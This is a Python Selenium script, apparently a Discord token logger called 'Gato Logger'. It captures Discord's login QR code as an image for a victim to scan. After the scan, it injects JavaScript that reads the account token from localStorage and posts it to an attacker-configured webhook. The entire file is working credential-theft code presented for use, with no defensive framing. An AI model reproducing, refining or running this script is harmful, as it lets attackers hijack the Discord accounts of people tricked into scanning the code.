from selenium.webdriver.common.by import By
from selenium import webdriver
import requests
import base64
import json
import time


# Load Config
with open("config.json", "r") as f:
    config = json.load(f)
    url = config["webhook"]
    class_name = config["class_dir"]

def send_webhook(token):
    data = {
                "content" : f"```{token} ```",
                "username" : "Gato Logger"
            }
    result = requests.post(url, json = data)
    if result.status_code == 204:
        print("Token Sent to Webhook")
    else:
        print("Error Sending Token to Webhook")


def main():
    print ("Initalizing \n")

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options)

    print('Loading page...')
    driver.get('https://discord.com/login')
    time.sleep(3)
    print('QR code visible')

    div_Class = driver.find_element(By.CLASS_NAME, class_name)
    b2 = div_Class.screenshot_as_base64

    imgdata = base64.b64decode(b2)
    
    with open("qr.png",'wb') as f:
        f.write(imgdata)

    
    print('[*] QR Code Captured!')
    input("Ready to start internal loop !")



    print("[*] Waiting for user to scan QR Code...")

    discord_login = driver.current_url


    while True:
        if discord_login != driver.current_url:
            print('Grabbing token... \n')
            
            token = driver.execute_script('''
window.dispatchEvent(new Event('beforeunload'));
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
let localStorage = iframe.contentWindow.localStorage;
var token = JSON.parse(localStorage.token);
return token;
   
''')
            print('Token grabbed:',token)
            send_webhook(token)
            break

    
    print('Finished, Exiting...')

if __name__ == '__main__':
    main()
